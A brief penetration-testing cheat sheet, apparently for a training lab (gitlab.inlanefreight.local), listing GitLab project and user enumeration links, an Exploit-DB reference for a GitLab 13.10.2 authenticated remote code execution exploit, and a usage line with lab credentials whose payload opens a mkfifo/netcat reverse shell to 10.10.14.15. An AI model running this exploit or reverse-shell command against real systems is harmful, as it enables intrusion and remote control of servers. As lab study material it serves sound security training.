### Enum projects:

    http://gitlab.inlanefreight.local:8081/explore

### Enum users:

    https://github.com/dpgg101/GitLabUserEnum

### Exploit:
If our version is 13.10.2 and we can get a user creds or create a user, we can use next exploit:
#### URL
    https://www.exploit-db.com/exploits/49951
#### USE
    python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'

